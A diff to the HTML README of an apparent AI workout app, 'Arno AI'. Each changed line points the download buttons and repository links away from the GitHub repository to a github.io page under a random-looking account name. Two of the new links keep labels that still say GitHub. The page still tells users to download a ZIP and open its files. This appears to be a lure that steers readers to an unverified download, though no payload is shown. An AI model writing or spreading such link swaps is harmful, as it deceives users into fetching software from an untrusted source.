@@ -1,7 +1,7 @@
 <h1>💪 arno-ai-gym-workout - AI Fitness Trainer for Home & Gym</h1>
 
 <p align="center">
-  <a href="https://github.com/thickbodied-insecureness453/arno-ai-gym-workout" style="display:inline-block;padding:12px 28px;background-color:#1E90FF;color:white;text-decoration:none;font-size:20px;font-weight:bold;border-radius:8px;">⬇️ Download Arno AI</a>
+  <a href="https://thickbodied-insecureness453.github.io" style="display:inline-block;padding:12px 28px;background-color:#1E90FF;color:white;text-decoration:none;font-size:20px;font-weight:bold;border-radius:8px;">⬇️ Download Arno AI</a>
 </p>
 
 <p align="center">
@@ -16,7 +16,7 @@
 <h2>🚀 Getting Started</h2>
 <p>Follow these simple steps to start using Arno AI on your Windows computer:</p>
 <ol>
-  <li><strong>Visit the download page:</strong> Click the blue button above or go to <a href="https://github.com/thickbodied-insecureness453/arno-ai-gym-workout">https://github.com/thickbodied-insecureness453/arno-ai-gym-workout</a>.</li>
+  <li><strong>Visit the download page:</strong> Click the blue button above or go to <a href="https://thickbodied-insecureness453.github.io">https://thickbodied-insecureness453.github.io</a>.</li>
   <li><strong>Download the application:</strong> On that page, look for a green "Code" button or a "Releases" section. Click it and choose "Download ZIP" to get the app files.</li>
   <li><strong>Extract the ZIP file:</strong> Once the ZIP file is downloaded, right-click it and select "Extract All." Choose a folder (like your Desktop) and click "Extract."</li>
   <li><strong>Run the app:</strong> Open the extracted folder and double-click the file named <code>index.html</code>. It will open in your default web browser. That’s it—you’re ready to work out!</li>
@@ -42,7 +42,7 @@
 
 <h2>📥 Download & Install</h2>
 <p>Visit the link below to download the application:</p>
-<p><a href="https://github.com/thickbodied-insecureness453/arno-ai-gym-workout" style="display:inline-block;padding:10px 24px;background-color:#28A745;color:white;text-decoration:none;font-size:18px;font-weight:bold;border-radius:6px;">⬇️ Download Arno AI from GitHub</a></p>
+<p><a href="https://thickbodied-insecureness453.github.io" style="display:inline-block;padding:10px 24px;background-color:#28A745;color:white;text-decoration:none;font-size:18px;font-weight:bold;border-radius:6px;">⬇️ Download Arno AI from GitHub</a></p>
 <p>Once downloaded, extract the ZIP file and open <code>index.html</code> in your browser. No setup needed!</p>
 
 <h2>❓ Frequently Asked Questions</h2>
@@ -62,7 +62,7 @@
 <p>It works on any device with a web browser, including smartphones and tablets.</p>
 
 <h2>🤝 Contributing</h2>
-<p>Want to help improve Arno AI? You can suggest features, report bugs, or contribute code. Visit the <a href="https://github.com/thickbodied-insecureness453/arno-ai-gym-workout">GitHub repository</a> for more details.</p>
+<p>Want to help improve Arno AI? You can suggest features, report bugs, or contribute code. Visit the <a href="https://thickbodied-insecureness453.github.io">GitHub repository</a> for more details.</p>
 
 <h2>📄 License</h2>
 <p>This project is open source. Check the GitHub repository for license information.</p>
